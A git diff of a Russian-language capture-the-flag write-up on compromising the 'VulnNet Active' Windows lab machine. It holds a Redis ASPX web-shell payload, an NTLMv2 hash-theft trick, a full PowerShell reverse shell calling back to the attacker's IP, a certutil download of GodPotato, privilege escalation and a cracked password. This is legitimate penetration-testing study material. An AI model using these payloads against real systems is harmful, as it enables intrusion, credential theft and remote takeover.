@@ -1,130 +1,217 @@
-# Уязвимая машина: VulnNet Active (Write-up)
 
-**ОС:** Windows Server 2019
-**Уровень:** Medium
-**Векторы:** Unauthenticated Redis, NTLM Hash Stealing (Responder), Scheduled Task Hijacking, SeImpersonatePrivilege (GodPotato).
+# 🎯 VulnNet Active
+
+| Характеристика | Значение |
+| :--- | :--- |
+| **ОС** | Windows Server 2019 |
+| **Сложность** | Medium (Средняя) |
+| **Среда** | Active Directory |
+| **Ключевые векторы** | Unauthenticated Redis, NTLMv2 Hash Stealing, Hash Cracking, Scheduled Task Hijacking, `SeImpersonatePrivilege`, GodPotato |
 
 ---
 
 ## 1. Разведка (Reconnaissance)
 
-Сканирование портов (`RustScan` / `Nmap`):
+Первым делом проводим сканирование открытых портов. Использование `RustScan` позволяет быстро найти открытые порты, после чего в дело вступает `Nmap` для определения версий и запуска стандартных скриптов.
+
 ```bash
 rustscan -a 10.49.156.78 -- -sV -sC -A
 ```
 
-**Интересные находки:**
-*   `464 (kpasswd5), 9389 (mc-nmf)` — Маркеры контроллера домена Active Directory.
-*   `6379 (redis)` — **Аномалия**. In-Memory БД Redis, версия `2.8.2402`, работающая под Windows.
+**Анализ результатов сканирования:**
 
-Анонимный доступ по SMB запрещен (`enum4linux-ng` вернул `STATUS_LOGON_FAILURE`), поэтому мы переключаем внимание на Redis.
+| Порт | Служба | Описание / Значение для пентестера |
+| :--- | :--- | :--- |
+| `53`, `88`, `135`, `139`, `445` | DNS, Kerberos, RPC, SMB | Стандартный набор портов для контроллера домена Active Directory (DC). |
+| `464` | `kpasswd5` | Служба смены пароля Kerberos. Подтверждает наличие AD. |
+| `9389` | `mc-nmf` | AD Web Services. Дополнительное подтверждение контроллера домена. |
+| `6379` | `redis` | **Аномалия!** In-Memory база данных. Версия `2.8.2402`, работающая под Windows. |
+
+> 💡 **Разведка SMB:** Попытка анонимного подключения по SMB (например, через `enum4linux-ng` или `smbmap`) возвращает ошибку `STATUS_LOGON_FAILURE`. Нулевая сессия (Null Session) отключена. Точкой входа становится Redis.
 
 ---
 
-## 2. Первоначальный доступ: Атака на Redis
+## 2. Первоначальный доступ (Initial Access)
 
-Подключаемся к порту 6379. База пускает нас **без пароля**. Вывод команды `info` подтверждает, что это Windows-версия. (посмотреть, что внутри можно через команды (INFO, KEYS *))
+### 2.1. Исследование Redis
 
-> 💡 **Справка по Redis: Как работает RCE через конфигурацию**
-> В старых версиях Redis злоумышленник может менять конфигурацию "на лету".
-> *   `CONFIG SET dir "<путь>"` — меняет рабочую директорию сервера (куда он сохраняет бэкапы).
-> *   `CONFIG SET dbfilename "<имя_файла>"` — задает имя файла бэкапа (например, `shell.php` или `payload.bat`).
-> *   `SAVE` — принудительно сбрасывает базу данных из оперативной памяти на жесткий диск по указанному пути.
+Подключаемся к порту `6379` с помощью стандартного клиента `redis-cli` (или через `nc`). База пускает нас **без пароля** (Unauthenticated Access).
 
-Прямая запись файлов на диск (Arbitrary File Write) здесь не дает мгновенного RCE, так как на сервере нет веб-сервера (80/443 порты закрыты). Мы используем другой вектор: **принудительную NTLM-аутентификацию**.
+```bash
+redis-cli -h 10.49.156.78
+```
 
-### ❌ Кроличья нора №1: Обход песочницы Lua
-Поскольку версия древняя, первая мысль — попытаться выполнить системные команды через движок Lua (EVAL).
+Полезные команды для базового сбора информации:
+*   `INFO` — выводит системную информацию (версия ОС, версия Redis, архитектура).
+*   `KEYS *` — показывает все ключи в текущей базе.
+*   `GET <key>` — прочитать значение конкретного ключа.
 
-*.txt
-Plaintext
-10.49.156.78:6379> EVAL "return os.execute('ping -n 3 ip')" 0
-(error) ERR Error running script ... Script attempted to access unexisting global variable 'os'
-Почему не сработало: Разработчики включили режим strict_lua. Песочница активна, опасные модули (os, io) удалены из глобального пространства имен.
+> 📚 **Шпаргалка: Классический RCE через конфигурацию Redis**
+> Если Redis запущен от root/SYSTEM и есть доступный веб-сервер, можно записать веб-шелл напрямую в директорию сайта:
+> ```redis
+> CONFIG SET dir "C:\inetpub\wwwroot"
+> CONFIG SET dbfilename "shell.aspx"
+> SET payload "<% Response.Write(eval(Request.Item[\"cmd\"])); %>"
+> SAVE
+> ```
+> *В нашем случае веб-сервера (порты 80/443) нет, поэтому записать шелл некуда. Нужно искать другой путь.*
 
-### Ловушка для NTLMv2
-В среде Windows, если заставить службу обратиться к сетевой папке (UNC-пути), ОС попытается авторизоваться на ней, передав хэш пароля учетной записи службы.
+### 2.2. ❌ Кроличья нора №1: Обход песочницы Lua
 
-1. Запускаем `Responder`:
-   ```bash
-   sudo responder -I tun0 -dwv
-   ```
-2. В консоли Redis заставляем сервер обратиться к нашему IP-адресу:
-   ```text
-   10.49.156.78:6379> CONFIG SET dir "//192.168.156.81/share"
-   (error) ERR Changing directory: Permission denied
-   ```
+Поскольку версия Redis довольно старая, логичной кажется попытка выполнить системные команды через встроенный движок Lua (команда `EVAL`).
 
-Несмотря на то, что консоль Redis выдала ошибку `Permission denied`, **в этот самый момент Responder успешно перехватил NTLMv2-хэш пользователя `enterprise-security`!**
+```redis
+10.49.156.78:6379> EVAL "return os.execute('ping -n 3 192.168.156.81')" 0
+```
+**Результат:**
+`(error) ERR Error running script ... Script attempted to access unexisting global variable 'os'`
 
-Забираем хэш из Responder, скармливаем его Hashcat (`hashcat -m 5600`) и получаем пароль записи enterprise-security.
+**Причина неудачи:** Разработчики включили режим `strict_lua`. Песочница активна, опасные модули (такие как `os` и `io`) удалены из глобального пространства имен. Обход песочницы в этой версии невозможен.
 
+### 2.3. Вектор атаки: Кража NTLMv2 хэша через UNC-путь
+
+В среде Windows любая служба, пытающаяся обратиться к сетевой папке (UNC-пути), автоматически пытается авторизоваться на ней, передавая NTLMv2-хэш учетной записи, от имени которой запущена служба.
+
+**Шаг 1: Запуск прослушивателя Responder на машине атакующего**
+`Responder` создаст поддельный SMB-сервер для перехвата аутентификации.
+```bash
+sudo responder -I tun0 -dwv
+```
+
+**Шаг 2: Принуждение Redis к подключению**
+В консоли Redis заставляем сервер установить рабочую директорию на нашу машину:
+```redis
+10.49.156.78:6379> CONFIG SET dir "//192.168.156.81/share"
+```
+*Примечание: Вывод консоли может выдать `(error) ERR Changing directory: Permission denied`. Не обращайте внимания! Попытка подключения всё равно произошла до проверки прав на запись.*
+
+**Шаг 3: Перехват и взлом**
+Смотрим в окно `Responder` и видим пойманный хэш пользователя `enterprise-security`.
+Копируем хэш в файл `hash.txt` и отдаем его **Hashcat**:
+
+```bash
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+```
 ---
 
 ## 3. Закрепление: Эксплуатация планировщика задач
 
-Имея учетные данные, проверяем доступные SMB-шары:
-```bash
-smbmap -H 10.49.156.78 -u "enterprise-security" -p 'sand_0873959498'
-```
-У нас есть права **READ, WRITE** на шару `Enterprise-Share`. Внутри лежит PowerShell-скрипт `PurgeIrrelevantData_1826.ps1`. Очевидно, что это скрипт очистки, который регулярно запускается планировщиком задач (Scheduled Task).
+С учетными данными на руках проверяем доступные SMB-шары (сетевые папки).
 
-Генерируем свой PowerShell Reverse Shell с таким же именем, запускаем `nc -lvnp 4444` и подменяем оригинальный файл через `smbclient`:
-```text
-smb: \> lcd /tools/
+```bash
+smbmap -H 10.49.156.78 -u "enterprise-security" -p "sand_0873959498"
+```
+
+| Имя шары | Права доступа | Описание |
+| :--- | :--- | :--- |
+| `ADMIN$` | NO ACCESS | Административная шара |
+| `C$` | NO ACCESS | Диск C |
+| `SYSVOL` | READ ONLY | Стандартная шара AD |
+| `NETLOGON` | READ ONLY | Стандартная шара AD |
+| **`Enterprise-Share`** | **READ, WRITE** | Пользовательская шара с правами на запись |
+
+Заходим в шару `Enterprise-Share` через `smbclient`:
+```bash
+smbclient //10.49.156.78/Enterprise-Share -U "enterprise-security%sand_0873959498"
+```
+Внутри находим файл `PurgeIrrelevantData_1826.ps1`. Судя по названию и факту его существования в расшаренной папке, этот скрипт периодически выполняется планировщиком задач (Task Scheduler).
+
+**Создание Reverse Shell:**
+Генерируем PowerShell reverse shell.
+
+```powershell
+# Сохраняем это локально под именем PurgeIrrelevantData_1826.ps1
+$client = New-Object System.Net.Sockets.TCPClient("192.168.156.81",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+Запускаем листенер `nc -lvnp 4444` и подменяем файл на сервере:
+```bash
 smb: \> put PurgeIrrelevantData_1826.ps1
 ```
-Планировщик срабатывает, и мы получаем Shell!
-как вариант: использовать ```certutil.exe -urlcache -split -f http://192.168.156.81/GodPotato-NET4.exe GodPotato-NET4.exe```
+
+Через минуту планировщик срабатывает, и мы получаем сессию в Netcat от имени пользователя `enterprise-security`!
 
 ---
 
 ## 4. Повышение привилегий (Privilege Escalation)
 
-Проверяем привилегии пользователя в полученном шелле:
+Проверяем наши текущие привилегии в системе.
+
 ```powershell
 PS C:\> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                               State
+============================= ========================================= =======
+SeMachineAccountPrivilege     Add workstations to domain                Enabled
 SeImpersonatePrivilege        Impersonate a client after authentication Enabled
 ```
-Наличие `SeImpersonatePrivilege` — это 100% путь к правам `SYSTEM` через уязвимости семейства Potato.
 
-### ❌ Кроличья нора: Мертвый PrintSpoofer
-Классическим выбором для Server 2019 является эксплойт `PrintSpoofer64.exe`. Мы загружаем его на сервер, но команда `.\PrintSpoofer64.exe -i -c cmd` не дает вывода. 
-Попытка использовать "слепое" выполнение с перенаправлением в файл (`-c "cmd /c whoami > whoami.txt"`) тоже проваливается — файл не создается. Эксплойт не работает вообще.
+> 📚 **Справка: SeImpersonatePrivilege**
+> Эта привилегия позволяет пользователю запускать процессы от имени другого клиента, который аутентифицировался у этого пользователя. Это классическая брешь в Windows (часто встречается у сервисных учеток IIS, SQL и т.д.), которая позволяет повысить права до `NT AUTHORITY\SYSTEM` с помощью уязвимостей семейства "Potato".
 
-**В чем причина? Проверяем службы!**
-PrintSpoofer использует для своей работы диспетчер печати. В современных и запатченных системах (особенно после уязвимостей PrintNightmare) админы часто его отключают. Проверим это:
+### 4.1. ❌ Кроличья нора №2: Мертвый PrintSpoofer
+
+Стандартный выбор для Windows Server 2016/2019 с `SeImpersonate` — это `PrintSpoofer64.exe`.
+Загружаем эксплойт на сервер (например, через `certutil`) и пытаемся запустить:
+
+```powershell
+.\PrintSpoofer64.exe -i -c cmd
+```
+**Результат:** Зависание или отсутствие вывода. Перенаправление вывода в файл (`-c "cmd /c whoami > C:\Temp\whoami.txt"`) тоже ничего не дает.
+
+**Анализ причин:**
+PrintSpoofer использует службу диспетчера печати (Print Spooler) для принуждения SYSTEM к аутентификации. Проверяем статус службы:
 ```powershell
 PS C:\> Get-Service Spooler
 Status   Name               DisplayName
 ------   ----               -----------
 Stopped  Spooler            Print Spooler
 ```
-Служба остановлена. PrintSpoofer здесь бесполезен.
+После эпидемии уязвимостей "PrintNightmare" администраторы повсеместно стали отключать эту службу на серверах. PrintSpoofer здесь бесполезен.
 
-### ✅ Успешный вектор: GodPotato
-Переключаемся на современный аналог — **GodPotato** (работает через DCOM и не зависит от Spooler'a). Скачиваем `GodPotato.exe` 
-Используем эксплойт для изменения конфигурации ОС — добавим нашего юзера в группу локальных администраторов:
+### 4.2. ✅ Успешный вектор: GodPotato
+
+Когда `Spooler` отключен, на помощь приходят современные аналоги, работающие через механизмы DCOM / RPC, например **GodPotato** или **RoguePotato**.
+
+**Шаг 1: Загрузка эксплойта на целевую машину**
+На своей машине запускаем Python HTTP-сервер (`python3 -m http.server 80`), а на целевой выполняем:
 ```powershell
-.\GodPotato.exe -cmd "net localgroup Administrators enterprise-security /add"
+certutil.exe -urlcache -split -f "http://192.168.156.81/GodPotato-NET4.exe" C:\Windows\Temp\GodPotato-NET4.exe
 ```
-Команда успешно выполнена. Пользователь `enterprise-security` теперь обладает полными правами.
+
+**Шаг 2: Изменение конфигурации ОС**
+Вместо того чтобы пытаться прокинуть обратный шелл от SYSTEM (что иногда багует или блокируется антивирусами), используем эксплойт для надежного закрепления — **добавим нашего текущего пользователя в группу локальных администраторов**.
+
+```powershell
+cd C:\Windows\Temp\
+.\GodPotato-NET4.exe -cmd "net localgroup Administrators enterprise-security /add"
+```
+
+Команда выполняется в контексте `SYSTEM`. Проверяем результат:
+```powershell
+net user enterprise-security
+```
+В выводе в разделе `Local Group Memberships` видим `*Administrators`. Мы получили полные права!
 
 ---
 
 ## 5. Сбор флагов (Post-Exploitation)
 
-Будучи администраторами, мы можем использовать инструменты из набора Impacket (`psexec.py` или `wmiexec.py`) или просто подключиться по smb для получения системной консоли.
+Поскольку наш пользователь `enterprise-security` теперь состоит в группе Администраторов, мы можем напрямую подключиться к серверу, минуя обратный шелл, используя инструменты пакета **Impacket**.
 
+**Вариант 1: Интерактивный системный шелл через PsExec**
 ```bash
-smbclient //10.49.172.137/C$ -U "vulnnet.local\enterprise-security%sand_0873959498"
+impacket-psexec vulnnet.local/enterprise-security:'sand_0873959498'@10.49.156.78
 ```
-Успешный логин! Переходим в директорию администратора и забираем флаг:
-```text
-smb: \> cd Users\Administrator\Desktop
+*Вы получите командную строку с правами `NT AUTHORITY\SYSTEM`.*
+
+**Вариант 2: Забор флага через SMB (бесшумно)**
+Подключаемся к административной скрытой шаре `C$`:
+```bash
+smbclient //10.49.156.78/C$ -U "enterprise-security%sand_0873959498"
 ```
+Флаг пользователя `user.txt` можно аналогично забрать из `C:\Users\enterprise-security\Desktop\user.txt`.
 
-**Машина пройдена (Pwned)!** 🚩
-
----
-*Надеюсь, этот райтап поможет вам не только пройти машину, но и понять логику работы уязвимостей и сетевых протоколов Windows. Удачи в пентесте!*
+**🎯 Машина пройдена (System Pwned)!**
